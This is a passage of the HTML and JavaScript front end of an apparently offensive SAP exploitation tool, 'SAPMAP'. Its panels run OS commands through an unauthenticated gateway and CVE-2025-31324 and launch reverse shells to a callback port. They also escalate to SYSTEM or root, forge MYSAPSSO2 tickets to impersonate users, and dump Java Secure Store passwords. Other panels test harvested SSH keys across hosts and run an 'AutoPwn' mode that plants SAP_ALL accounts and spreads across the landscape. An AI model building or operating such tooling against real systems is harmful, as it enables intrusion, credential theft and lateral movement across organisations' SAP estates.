      <label>SAProuter String (optional)</label>
      <input type="text" id="add-saprouter" placeholder="/H/router_ip/S/3299/W/password" style="width:100%">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">Route prefix to reach this system via SAProuter. Target host/port are appended automatically.</span>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="addSystem()">Add System</button>
      <button class="btn" onclick="closeModal('add-system-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set Default Password Modal -->
<div class="modal-overlay" id="password-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();setDefaultPassword();}">
    <h3>&#128273; Set Default Password</h3>
    <p style="font-size:12px;color:#8b949e;margin-bottom:12px">
      This password is used when creating SAPMAP00 users on target systems (via BAPI, GW exploit, or SXPG).
      Change takes effect immediately for this session.
    </p>
    <div class="form-row">
      <label>Current Password</label>
      <input type="text" id="pwd-current" readonly style="color:#484f58;background:#161b22">
    </div>
    <div class="form-row">
      <label>New Password</label>
      <input type="text" id="pwd-new" placeholder="Enter new password">
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="setDefaultPassword()">Set Password</button>
      <button class="btn" onclick="closeModal('password-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- TCP/IP Destination Modal -->
<div class="modal-overlay" id="tcpip-modal">
  <div class="modal">
    <h3>&#128279; Create TCP/IP Destination (sapxpg)</h3>
    <div id="tcpip-source-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Target System</label>
      <select id="tcpip-target"></select>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="createTcpipDest()">Create</button>
      <button class="btn" onclick="closeModal('tcpip-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Propagate Target Picker Modal -->
<div class="modal-overlay" id="propagate-modal">
  <div class="modal">
    <h3>&#128640; Propagate to Next Hop</h3>
    <div id="propagate-source-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Target System</label>
      <select id="propagate-target"></select>
    </div>
    <div id="propagate-hint" style="font-size:11px;color:#8b949e;margin-top:4px"></div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="doPropagateTarget()">Propagate</button>
      <button class="btn" onclick="closeModal('propagate-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- OS Command Terminal Modal -->
<div class="modal-overlay" id="terminal-modal">
  <div class="modal shell-window" id="term-window">
    <div class="shell-titlebar" id="term-titlebar">
      <h3 style="margin:0">&#128187; OS Command Terminal — <span id="term-sid"></span></h3>
    </div>
    <div style="flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column">
    <div style="font-size:11px;color:#8b949e;margin-bottom:8px" id="term-info"></div>
    <div class="form-row" style="display:flex;gap:8px;align-items:flex-end;flex-shrink:0">
      <div style="flex:1">
        <label>Method</label>
        <select id="term-method" style="width:100%">
          <option value="gateway">Gateway (unauthenticated)</option>
          <option value="sxpg">SXPG (via SAP_ALL user)</option>
          <option value="soap_rfc" id="term-method-soap-rfc">SXPG over SOAP-RFC (HTTP only — for firewalled gateway)</option>
          <option value="cve_31324">CVE-2025-31324 (Java unauth)</option>
          <option value="winlpe_system" id="term-method-winlpe">&#128293; NT AUTHORITY\SYSTEM (via Windows LPE)</option>
          <option value="linuxlpe_root" id="term-method-linuxlpe">&#128293; root (via Linux LPE)</option>
        </select>
      </div>
      <div style="flex:3">
        <label>Command</label>
        <input type="text" id="term-cmdline" placeholder="e.g. whoami, ls -la /tmp, cat /etc/passwd" style="width:100%;font-family:monospace"
               autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false"
               onkeydown="if(event.key==='Enter'){event.preventDefault();termExec();}">
      </div>
      <button class="btn btn-primary" onclick="termExec()" style="white-space:nowrap">Run</button>
    </div>
    <div id="term-output" style="background:#010409;border:1px solid #30363d;border-radius:4px;
      padding:8px;margin-top:8px;font-family:monospace;font-size:12px;color:#7ee787;
      min-height:120px;flex:1;overflow-y:auto;white-space:pre-wrap;word-break:break-all;
      user-select:text;-webkit-user-select:text;cursor:text">
      Ready. Enter a command above and click Run.
    </div>
    <div class="form-actions" style="margin-top:8px;flex-shrink:0">
      <button class="btn" onclick="document.getElementById('term-output').textContent=''">Clear</button>
      <button class="btn" onclick="closeModal('terminal-modal')">Close</button>
    </div>
    </div>
    <div class="shell-resize-handle" id="term-resize-handle"></div>
  </div>
</div>

<!-- File Browser Modal -->
<div class="modal-overlay" id="fb-modal">
  <div class="modal shell-window" id="fb-window" style="width:900px;height:600px">
    <div class="shell-titlebar" id="fb-titlebar">
      <h3 style="margin:0">&#128193; File Browser &mdash; <span id="fb-sid"></span></h3>
    </div>
    <div style="flex:1;overflow:hidden;padding:12px;display:flex;flex-direction:column">
      <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-shrink:0">
        <button class="btn" onclick="fbNavigate('..')" title="Go up one level" style="padding:4px 10px;font-size:16px">&#11014;</button>
        <input type="text" id="fb-path" value="/tmp" style="flex:1;font-family:monospace;font-size:13px"
               onkeydown="if(event.key==='Enter'){event.preventDefault();fbNavigate(this.value);}">
        <button class="btn btn-primary" onclick="fbNavigate(document.getElementById('fb-path').value)" style="white-space:nowrap">Go</button>
        <button class="btn" onclick="fbRefresh()" title="Refresh">&#8635;</button>
      </div>
      <div id="fb-drives" style="display:none;font-size:11px;margin-bottom:4px;flex-shrink:0;gap:4px;flex-wrap:wrap;align-items:center"></div>
      <div id="fb-banner" style="font-size:11px;margin-bottom:4px;flex-shrink:0"></div>
      <div id="fb-status" style="font-size:11px;color:#8b949e;margin-bottom:6px;flex-shrink:0"></div>
      <div id="fb-progress-wrap" style="display:none;margin-bottom:6px;flex-shrink:0">
        <div style="display:flex;justify-content:space-between;font-size:11px;color:#8b949e;margin-bottom:2px">
          <span id="fb-progress-label">Downloading...</span>
          <span id="fb-progress-pct">0%</span>
        </div>
        <div style="width:100%;height:8px;background:#161b22;border:1px solid #30363d;border-radius:4px;overflow:hidden">
          <div id="fb-progress-bar" style="width:0%;height:100%;background:linear-gradient(90deg,#238636,#3fb950);transition:width 0.3s ease"></div>
        </div>
      </div>
      <div style="overflow-y:auto;flex:1 1 0;border:1px solid #30363d;border-radius:4px;
                  user-select:text;-webkit-user-select:text;cursor:default;
                  scrollbar-width:auto;scrollbar-color:#484f58 #161b22">
        <table style="width:100%;border-collapse:collapse;font-size:12px;font-family:monospace">
          <thead style="position:sticky;top:0;background:#161b22;z-index:1">
            <tr style="color:#8b949e;border-bottom:1px solid #30363d">
              <th style="text-align:left;padding:6px 8px;width:40px"></th>
              <th id="fb-th-name" style="text-align:left;padding:6px 8px;cursor:pointer;user-select:none" onclick="fbSort('name')">Name <span id="fb-sort-name" style="color:#484f58"></span></th>
              <th id="fb-th-size" style="text-align:right;padding:6px 8px;width:90px;cursor:pointer;user-select:none" onclick="fbSort('size')">Size <span id="fb-sort-size" style="color:#484f58"></span></th>
              <th id="fb-th-mode" style="text-align:left;padding:6px 8px;width:110px;cursor:pointer;user-select:none" onclick="fbSort('mode')">Mode <span id="fb-sort-mode" style="color:#484f58"></span></th>
              <th id="fb-th-mtime" style="text-align:left;padding:6px 8px;width:180px;cursor:pointer;user-select:none" onclick="fbSort('mtime')">Modified <span id="fb-sort-mtime" style="color:#484f58"></span></th>
              <th style="text-align:center;padding:6px 8px;width:60px"></th>
            </tr>
          </thead>
          <tbody id="fb-tbody"></tbody>
        </table>
      </div>
      <div style="display:flex;gap:8px;align-items:center;margin-top:8px;flex-shrink:0">
        <label class="btn" style="cursor:pointer;margin:0" title="Upload a file to the current directory">
          &#11014; Upload
          <input type="file" id="fb-upload-input" style="display:none" onchange="fbUploadFile()">
        </label>
        <span id="fb-upload-status" style="font-size:11px;color:#8b949e;flex:1"></span>
        <button class="btn" onclick="closeModal('fb-modal')">Close</button>
      </div>
    </div>
    <div class="shell-resize-handle" id="fb-resize-handle"></div>
  </div>
</div>

<!-- Java Secure Store Results Modal — draggable + resizable -->
<div class="modal-overlay" id="jss-modal">
  <div class="modal shell-window" id="jss-window" style="width:1100px;height:640px">
    <div class="shell-titlebar" id="jss-titlebar">
      <h3 style="margin:0">&#128273; Java Secure Store &mdash; <span id="jss-sid"></span></h3>
    </div>
    <div style="flex:1;overflow:hidden;padding:12px;display:flex;flex-direction:column">
      <div id="jss-meta" style="font-size:11px;color:#8b949e;margin-bottom:8px"></div>
      <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center;flex-shrink:0">
        <input type="text" id="jss-filter" placeholder="filter by name, value, destination name, user, target SID/client..." style="flex:1" oninput="renderJssTable()">
        <label style="font-size:11px;color:#8b949e">
          <input type="checkbox" id="jss-showpw" onchange="renderJssTable()" checked> Show passwords
        </label>
        <label style="font-size:11px;color:#8b949e" title="Framework-internal noise: #~childInstance.N, #~data-source-aliases.xml, #~Secured Property*, and rows whose decrypt was refused (kind=undecryptable).  Hidden by default because they never contain user-facing secrets.">
          <input type="checkbox" id="jss-shownoise" onchange="renderJssTable()"> Show noise (childInstance, aliases.xml, Secured Property*, undecryptable)
        </label>
        <button class="btn" onclick="copyJssJson()" style="white-space:nowrap">Copy JSON</button>
      </div>
      <div style="overflow-y:scroll;overflow-x:auto;flex:1 1 0;min-height:200px;
                  border:1px solid #30363d;border-radius:4px;
                  user-select:text;-webkit-user-select:text;cursor:text;
                  scrollbar-width:auto;scrollbar-color:#484f58 #161b22">
        <table id="jss-table" style="width:100%;border-collapse:collapse;font-size:12px;font-family:monospace;
                                       user-select:text;-webkit-user-select:text">
          <thead style="position:sticky;top:0;background:#161b22;z-index:1">
            <tr style="color:#8b949e;border-bottom:1px solid #30363d">
              <th style="text-align:left;padding:6px 8px">Source</th>
              <th style="text-align:left;padding:6px 8px">Kind</th>
              <th style="text-align:left;padding:6px 8px">Belongs to</th>
              <th style="text-align:left;padding:6px 8px">Name</th>
              <th style="text-align:left;padding:6px 8px">Value</th>
              <th style="width:80px;padding:6px 8px"></th>
            </tr>
          </thead>
          <tbody id="jss-tbody"></tbody>
        </table>
      </div>
      <div class="form-actions" style="margin-top:8px;flex-shrink:0">
        <button class="btn" onclick="closeModal('jss-modal')">Close</button>
      </div>
    </div>
    <div class="shell-resize-handle" id="jss-resize-handle"></div>
  </div>
</div>

<!-- Reverse Shell Modal -->
<div class="modal-overlay" id="shell-modal">
  <div class="modal shell-window" id="shell-window">
    <div class="shell-titlebar" id="shell-titlebar">
      <h3 style="margin:0">&#128279; Shell — <span id="shell-sid"></span></h3>
    </div>
    <div style="flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column">
    <div id="shell-config">
      <div style="font-size:11px;color:#8b949e;margin-bottom:8px" id="shell-info"></div>
      <div style="display:flex;gap:8px;margin-bottom:8px">
        <div style="flex:1">
          <label style="font-size:11px;color:#8b949e">Execution Method</label>
          <select id="shell-method" style="width:100%">
            <option value="gateway">Gateway (unauthenticated)</option>
            <option value="sxpg">SXPG (via SAP_ALL user)</option>
            <option value="cve_31324">CVE-2025-31324 (Java unauth)</option>
          </select>
        </div>
        <div style="flex:1">
          <label style="font-size:11px;color:#8b949e">Shell Mode</label>
          <select id="shell-mode" style="width:100%" onchange="shellModeChanged()">
            <option value="reverse">Reverse Shell (target connects to us)</option>
            <option value="bind">Bind Shell (we connect to target)</option>
          </select>
        </div>
      </div>
      <div style="display:flex;gap:8px;margin-bottom:8px">
        <div style="flex:1" id="shell-ip-row">
          <label style="font-size:11px;color:#8b949e">Callback IP (our IP)</label>
          <input type="text" id="shell-ip" placeholder="auto-detecting..." style="width:100%">
        </div>
        <div style="width:80px">
          <label style="font-size:11px;color:#8b949e">Port</label>
          <input type="text" id="shell-port" value="4444" style="width:100%">
        </div>
      </div>
      <div style="font-size:10px;color:#484f58;margin-bottom:8px" id="shell-payload-preview"></div>
      <button class="btn btn-primary" onclick="shellStart()" style="width:100%">&#9654; Start Listener &amp; Send Payload</button>
    </div>
    <div id="shell-status-bar" style="display:none;padding:6px 0;font-size:12px">
      <span id="shell-status-dot" style="display:inline-block;width:10px;height:10px;border-radius:50%;background:#484f58;margin-right:6px;vertical-align:middle"></span>
      <span id="shell-status-text">Idle</span>
    </div>
    <div id="shell-terminal" style="display:none;background:#010409;border:1px solid #30363d;border-radius:4px;
      padding:8px;margin-top:4px;font-family:monospace;font-size:12px;color:#7ee787;
      min-height:200px;flex:1;overflow-y:auto;white-space:pre-wrap;word-break:break-all;
      user-select:text;-webkit-user-select:text;cursor:text"></div>
    <div id="shell-input-bar" style="display:none;margin-top:4px;gap:4px">
      <input type="text" id="shell-input" placeholder="Type command..." style="flex:1;font-family:monospace"
             disabled autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false"
             onkeydown="if(event.key==='Enter'){event.preventDefault();shellSendInput();}">
      <button class="btn" onclick="shellSendInput()" id="shell-send-btn" disabled>Send</button>
    </div>
    <div class="form-actions" style="margin-top:8px;flex-shrink:0">
      <button class="btn btn-danger" onclick="shellStop()" id="shell-stop-btn" style="display:none">&#9724; Stop</button>
      <button class="btn" onclick="shellClose()">Close</button>
    </div>
    </div>
    <div class="shell-resize-handle" id="shell-resize-handle"></div>
  </div>
</div>

<!-- AutoPwn Config Modal -->
<div class="modal-overlay" id="autopwn-config-modal">
  <div class="modal" style="max-width:520px;width:95vw">
    <h3 style="color:#f85149">&#9889; AutoPwn — Full Landscape Exploitation</h3>
    <div style="font-size:12px;color:#c9d1d9;margin-bottom:12px">
      Automatically scan, exploit, and propagate across the entire SAP landscape
      until no further progress is possible.
    </div>
    <div style="font-size:11px;color:#8b949e;margin-bottom:6px;font-weight:600">
      Vulnerability Checks (exploitable):
    </div>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-scan-gw" checked> Gateway SAPXPG</label>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-scan-10k"> 10KBlaze (CVE-2020-6207) — slow, off by default</label>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-scan-31324" checked> CVE-2025-31324 (VisualComposer RCE)</label>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-scan-recon" checked> CVE-2020-6287 (RECON)</label>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-dpmon-sapstar" checked> dpmon virtual SAP* (kernel &ge; 790, ABAP only)</label>

    <div style="font-size:11px;color:#8b949e;margin:10px 0 6px;font-weight:600">
      Post-run detection (non-exploitable, reported only):
    </div>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-det-icmad" checked> CVE-2022-22536 (ICMAD)</label>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-det-router" checked> SAProuter Info Leak</label>

    <div style="font-size:11px;color:#8b949e;margin:10px 0 6px;font-weight:600">
      Optional phases:
    </div>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-lpe"> OS Privilege Escalation (LPE)</label>
    <label class="autopwn-cb"><input type="checkbox" id="apwn-btp" checked> BTP / Cloud lateral movement</label>

    <div class="form-row" style="margin-top:12px">
      <label>Max waves</label>
      <select id="apwn-max-waves" style="width:80px">
        <option value="3">3</option>
        <option value="5" selected>5</option>
        <option value="10">10</option>
        <option value="20">20</option>
      </select>
    </div>

    <div style="margin-top:12px;padding:8px;background:#1a1208;border:1px solid #5a4a20;border-radius:6px;font-size:11px;color:#d29922">
      <strong>Warning:</strong> This creates SAPMAP00 users with SAP_ALL on every
      exploitable system. ICMAD + SAProuter Info Leak are detection-only
      (no accounts created, no exploitation). Press STOP at any time to halt.
    </div>

    <div class="form-actions">
      <button class="btn" onclick="closeModal('autopwn-config-modal')">Cancel</button>
      <button class="btn btn-primary" onclick="launchAutoPwn()" style="background:#f85149;border-color:#f85149">&#9889; Start AutoPwn</button>
    </div>
  </div>
</div>

<!-- =====================================================
     MYSAPSSO2 ticket-forgery modals
     ===================================================== -->

<!-- 1. Forge MYSAPSSO2 Ticket Modal -->
<div class="modal-overlay" id="forge-ticket-modal">
  <div class="modal" style="max-width:560px;width:95vw">
    <h3>&#127915; Forge MYSAPSSO2 Logon Ticket</h3>
    <div id="forge-ticket-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
      Extracts <code>SAPSYS.pse</code> via sapxpg, decrypts the signing
      key, and mints a ticket impersonating the chosen user.  The
      ticket lands on this node's <code>forged_tickets</code> list and
      is saved under <code>loot/tickets/&lt;SID&gt;_&lt;user&gt;_&lt;ts&gt;/</code>.
    </div>
    <div class="form-row">
      <label>Impersonate user</label>
      <input type="text" id="forge-ticket-user" placeholder="SAP*" style="width:140px">
      <span style="font-size:10px;color:#484f58;margin-left:8px">e.g. SAP*, DDIC, JORIS</span>
    </div>
    <div class="form-row">
      <label>Client</label>
      <input type="text" id="forge-ticket-client" placeholder="100" style="width:80px">
    </div>
    <div class="form-row">
      <label>Validity (min)</label>
      <input type="number" id="forge-ticket-validity" placeholder="480" min="1" max="1440" style="width:80px">
      <span style="font-size:10px;color:#484f58;margin-left:8px">SAP default: 480 (8h)</span>
    </div>
    <div class="form-row">
      <label>Signature digest</label>
      <select id="forge-ticket-digest" style="width:140px">
        <option value="sha1">sha1 (DSA-signed PSE, older kernels)</option>
        <option value="sha256" selected>sha256 (modern RSA/EC PSE)</option>
      </select>
    </div>
    <details style="margin-top:10px">
      <summary style="cursor:pointer;font-size:12px;color:#8b949e">Advanced (optional)</summary>
      <div class="form-row" style="margin-top:8px">
        <label>PIN override</label>
        <input type="text" id="forge-ticket-pin" placeholder="(skip candidate walk)" style="width:200px">
      </div>
      <div class="form-row">
        <label>Recipient SID</label>
        <input type="text" id="forge-ticket-recipient-sid" placeholder="(STRUSTSSO2 pin)" style="width:100px">
        <label style="margin-left:12px">client</label>
        <input type="text" id="forge-ticket-recipient-client" placeholder="" style="width:80px">
      </div>
    </details>
    <!-- Delivery-channel compatibility callout.
         Operators routinely ask "which SAP GUI can I use to launch
         the .sap shortcut and auto-login as the impersonated user?"
         The honest answer is Windows-only (see operator guide §3.1
         + the long comment block above _SAP_SHORTCUT_TEMPLATE in
         sap_ticket_delivery.py for the Java GUI dead-end).  Surface
         the matrix here so the operator doesn't get a misleading
         "logon failed" on a macOS/Linux workstation. -->
    <div style="margin-top:14px;padding:10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;font-size:11px;color:#8b949e;line-height:1.5">
      <div style="font-weight:600;color:#c9d1d9;margin-bottom:6px">&#128270; Delivery-channel compatibility</div>
      <div>&#9989; <strong style="color:#3fb950">SAP GUI for Windows</strong> &mdash; the generated <code>.sap</code> shortcut auto-logs you in as the impersonated user via the <code>at="MYSAPSSO2=..."</code> mechanism.  Double-click and done.</div>
      <div style="margin-top:4px">&#10060; <strong style="color:#f85149">SAP GUI for Java</strong> (macOS / Linux) &mdash; does NOT auto-login.  The Diag SSO field is "Reserved" per the v7.80 reference (vestigial from the discontinued mySAP.com Workplace); validated against live S4H, the Java GUI parses the <code>.sap</code> but never transmits the ticket.  You'll land at a password prompt.</div>
      <div style="margin-top:4px">&#9989; <strong style="color:#3fb950">Browser / WebGUI / Fiori</strong> &mdash; use the generated <code>curl.sh</code> or set the <code>MYSAPSSO2</code> cookie manually.  Works on every platform.</div>
      <div style="margin-top:4px">&#9989; <strong style="color:#3fb950">pyrfc / RFC client</strong> &mdash; use the generated <code>pyrfc.json</code>.  Works on every platform.</div>
    </div>
    <div class="form-actions">
      <button class="btn" onclick="closeModal('forge-ticket-modal')">Cancel</button>
      <button class="btn btn-primary" onclick="submitForgeTicket()">&#127915; Forge Ticket</button>
    </div>
  </div>
</div>

<!-- 2. Propagate Forged Ticket Modal -->
<div class="modal-overlay" id="propagate-ticket-modal">
  <div class="modal" style="max-width:580px;width:95vw">
    <h3>&#128640; Propagate Forged MYSAPSSO2 Ticket</h3>
    <div id="propagate-ticket-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
      Replays a previously forged ticket against STRUSTSSO2-trusted
      receivers using HTTP cookie + RFC channels.  Receivers are the
      SIDs you trust have the issuing system's cert in their
      <code>TWPSSO2ACL</code>.
    </div>
    <div class="form-row">
      <label>Ticket</label>
      <select id="propagate-ticket-select" style="width:340px"></select>
    </div>
    <div class="form-row">
      <label>Target SIDs</label>
      <input type="text" id="propagate-ticket-targets" placeholder="S4H,S4D,SOLMAN" style="width:340px">
      <span style="font-size:10px;color:#484f58;margin-left:6px">comma-separated</span>
    </div>
    <div class="form-row">
      <label>Channels</label>
      <label style="font-weight:normal"><input type="checkbox" id="propagate-ticket-http" checked> HTTP cookie</label>
      <label style="font-weight:normal;margin-left:12px"><input type="checkbox" id="propagate-ticket-rfc" checked> RFC (pyrfc)</label>
    </div>
    <div class="form-row">
      <label>Timeout (s)</label>
      <input type="number" id="propagate-ticket-timeout" value="10" min="1" max="120" style="width:80px">
    </div>
    <div class="form-actions">
      <button class="btn" onclick="closeModal('propagate-ticket-modal')">Cancel</button>
      <button class="btn btn-primary" onclick="submitPropagateTicket()">&#128640; Propagate</button>
    </div>
  </div>
</div>

<!-- SSH Lateral Movement Key Selection Modal -->
<div class="modal-overlay" id="ssh-lateral-modal">
  <div class="modal" style="max-width:580px;width:95vw">
    <h3>&#128640; SSH Lateral Movement</h3>
    <div id="ssh-lateral-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
      Select which harvested SSH private keys to test. Each selected key
      will be tried against <strong>every node on the map</strong> using
      discovered OS usernames (falls back to <code>root</code>).
    </div>
    <div id="ssh-lateral-keys-list" style="max-height:300px;overflow-y:auto;margin-bottom:12px"></div>
    <div class="form-actions">
      <button class="btn" onclick="closeModal('ssh-lateral-modal')">Cancel</button>
      <button class="btn btn-primary" id="ssh-lateral-go-btn" onclick="submitSshLateral()">&#128640; Test Selected Keys</button>
    </div>
  </div>
</div>

<!-- AutoPwn Progress Panel — docked right, map stays visible -->
<div class="autopwn-panel" id="autopwn-progress-panel">
  <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 16px 0 16px;flex-shrink:0">
    <h3 style="color:#f85149;margin:0;font-size:13px">&#9889; AutoPwn</h3>
    <div style="display:flex;gap:6px;align-items:center">
      <button class="btn btn-danger" onclick="stopAutoPwn()" id="apwn-stop-btn" style="font-size:10px;padding:2px 10px">&#9724; STOP</button>
      <button class="btn" onclick="closeAutoPwnPanel()" id="apwn-close-btn" style="font-size:10px;padding:2px 10px;display:none">&#10005; Close</button>
    </div>
  </div>
  <div class="autopwn-panel-body">
    <div id="apwn-wave-label" style="font-size:12px;color:#e6edf3;font-weight:600;margin-bottom:4px">Wave 0 / 5</div>

    <!-- Phase tracker -->
    <div class="autopwn-phases" id="apwn-phases">
      <div class="autopwn-phase" id="apwn-ph-scan">
        <span class="autopwn-phase-icon">&#128270;</span>
        <span class="autopwn-phase-label">SCAN</span>
        <span class="autopwn-phase-sub" id="apwn-ph-scan-sub"></span>
      </div>
      <span class="autopwn-arrow">&#9654;</span>
      <div class="autopwn-phase" id="apwn-ph-exploit">
        <span class="autopwn-phase-icon">&#128163;</span>
        <span class="autopwn-phase-label">EXPLOIT</span>
        <span class="autopwn-phase-sub" id="apwn-ph-exploit-sub"></span>
      </div>
      <span class="autopwn-arrow">&#9654;</span>
      <div class="autopwn-phase" id="apwn-ph-enrich">
        <span class="autopwn-phase-icon">&#128273;</span>
        <span class="autopwn-phase-label">ENRICH</span>
        <span class="autopwn-phase-sub" id="apwn-ph-enrich-sub"></span>
      </div>
      <span class="autopwn-arrow">&#9654;</span>
      <div class="autopwn-phase" id="apwn-ph-propagate">
        <span class="autopwn-phase-icon">&#128640;</span>
        <span class="autopwn-phase-label">SPREAD</span>
        <span class="autopwn-phase-sub" id="apwn-ph-propagate-sub"></span>
      </div>
      <span class="autopwn-arrow">&#9654;</span>
      <div class="autopwn-phase" id="apwn-ph-btp">
        <span class="autopwn-phase-icon">&#9729;</span>
        <span class="autopwn-phase-label">BTP</span>
        <span class="autopwn-phase-sub" id="apwn-ph-btp-sub"></span>
      </div>
      <span class="autopwn-arrow">&#9654;</span>
      <div class="autopwn-phase" id="apwn-ph-lpe">
        <span class="autopwn-phase-icon">&#9875;</span>
        <span class="autopwn-phase-label">LPE</span>
        <span class="autopwn-phase-sub" id="apwn-ph-lpe-sub"></span>
      </div>
    </div>

    <!-- Stats tiles -->
    <div class="autopwn-stats">
      <div class="autopwn-stat">
        <div class="autopwn-stat-val" id="apwn-st-scanned">0</div>
        <div class="autopwn-stat-label">Scanned</div>
      </div>
      <div class="autopwn-stat">
        <div class="autopwn-stat-val" id="apwn-st-vulnerable" style="color:#d29922">0</div>
        <div class="autopwn-stat-label">Vulnerable</div>
      </div>
      <div class="autopwn-stat">
        <div class="autopwn-stat-val" id="apwn-st-pwned" style="color:#f85149">0</div>
        <div class="autopwn-stat-label">Pwned</div>
      </div>
      <div class="autopwn-stat">
        <div class="autopwn-stat-val" id="apwn-st-users" style="color:#3fb950">0</div>
        <div class="autopwn-stat-label">Users</div>
      </div>
    </div>

    <!-- Progress bar -->
    <div style="display:flex;align-items:center;gap:8px">
      <div class="autopwn-bar-track" style="flex:1">
        <div class="autopwn-bar-fill" id="apwn-bar" style="width:0%"></div>
      </div>
      <span id="apwn-pct" style="font-size:11px;color:#8b949e;min-width:36px;text-align:right">0%</span>
    </div>

    <!-- Scrollable log -->
    <div class="autopwn-log" id="apwn-log"></div>
  </div>
</div>

<!-- Hidden file picker for Load State -->
<input type="file" id="file-picker" accept=".sapmap,.json" style="display:none" onchange="handleFileLoad(this)">

<script>
/* =========================================================================
   SAPMAP Frontend JavaScript
   ========================================================================= */

// --- State ---
let mapState = { nodes: {}, connections: [], stats: {} };
let localIp = '';
fetch('/api/local_ip').then(r => r.json()).then(d => { localIp = d.ip || ''; }).catch(() => {});
// ATT&CK catalog — fetched once at boot.  Used by renderAttackPills(),
// the node detail "ATT&CK observed" section, and the heatmap modal.
fetch('/api/attack/catalog').then(r => r.json()).then(d => {
  mapState.attack_catalog = d || {};
}).catch(() => {});
let consoleCursor = 0;
let findingsCursor = 0;
let _activeFindings = [];
// Manual dismissal → hide from banner, drawer AND node badge.
let _dismissedFindingIds = new Set();
// Auto-expire (5 s) → hide from banner only; badge + drawer keep it.
let _bannerHiddenIds = new Set();
let _findingsDrawerOpen = false;
// Issue #2 (item 3) — track which SID's Findings panel is currently
// open so the scan-poll loop can re-render it when new findings for
// that SID arrive.  The panel would otherwise stay stale until the
// operator closes and re-opens it.
let _openFindingsPanelSid = null;
let pollTimer = null;
let selectedNodeSid = null;
let dragNode = null;
let dragOffset = { x: 0, y: 0 };
let dragMoved = false;
let dragStartPos = { x: 0, y: 0 };
let unkPositions = {};  // persistent positions for unknown target boxes
let dbconPositions = {}; // persistent positions for DBCON cylinders (key: "sid|con_name")
let tmsPositions = {};   // persistent positions for TMS cylinders (key: "tms:sid|target|domain")

// Central detail-panel closer.  Clears data-view + dataset.sid so
// that when the operator later opens a different detail (SAP node,
// SCC, BTP, DBCON, TMS, chains…) there's no stale attribute left
// behind for the auto-refresh loop to re-hydrate off.  Previously
// closing a TMS detail then opening an S/4 SAP detail could
// resurrect the TMS view because dsid still said "tms:...".
function _closeDetailPanel() {
  const p = document.getElementById('detail-panel');
  if (!p) return;
  p.classList.remove('visible');
  p.removeAttribute('data-view');
  p.dataset.sid = '';
}
let activeTasks = {};   // key → label for active background operations
let knownNodeSids = new Set();   // SIDs seen in previous renders
let knownConnKeys = new Set();   // connection keys seen in previous renders
let firstRender = true;          // skip animations on initial load
let fadingNodes = {};            // sid → { start, duration } for nodes currently fading in
let viewBox = { x: 0, y: 0, w: 1200, h: 800 };
let viewBoxUserControlled = false;  // true once user zooms/pans
let isPanning = false;
let panStart = { x: 0, y: 0 };

// Pill colors matching SAPology
const PILL_COLORS = {
  'ABAP': '#0070f2', 'JAVA': '#d27700', 'ABAP+JAVA': '#0070f2',
  'BUSINESSOBJECTS': '#8b47d7', 'CLOUD_CONNECTOR': '#046c7a',
  'CONTENT_SERVER': '#256f3a', 'SAPROUTER': '#788fa6', 'MDM': '#5d36ff',
  'HANA': '#aa0808', 'MAXDB': '#e07900', 'MSSQL': '#2f5ea0',
  'ORACLE': '#c74634', 'DB2': '#054ada'
};
const PILL_LABELS = {
  'ABAP': 'ABAP', 'JAVA': 'Java', 'ABAP+JAVA': 'AB+Java',
  'BUSINESSOBJECTS': 'BO', 'CLOUD_CONNECTOR': 'SCC',
  'CONTENT_SERVER': 'Content', 'SAPROUTER': 'SAProuter', 'MDM': 'MDM',
  'HANA': 'HANA', 'MAXDB': 'MaxDB', 'MSSQL': 'MSSQL',
  'ORACLE': 'Oracle', 'DB2': 'DB2'
};

// --- API helpers ---
async function api(method, path, body) {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch('/api/' + path, opts);
  return res.json();
}

// --- Scan control ---
async function startScan() {
  const config = {
    targets: document.getElementById('targets').value,
    inst_from: parseInt(document.getElementById('inst-from').value),
    inst_to: parseInt(document.getElementById('inst-to').value),
    threads: parseInt(document.getElementById('threads').value),
    timeout: parseFloat(document.getElementById('timeout').value) || 3,
    fast_mode: document.querySelector('input[name="scanmode"]:checked').value === 'fast',
    concurrent_hosts: parseInt(document.getElementById('adv-concurrent').value) || 5,
    port_timeout: parseFloat(document.getElementById('adv-port-timeout').value) || 2.0,
    alive_timeout: parseFloat(document.getElementById('adv-alive-timeout').value) || 0.5,
    skip_alive: document.getElementById('adv-skip-alive').checked,
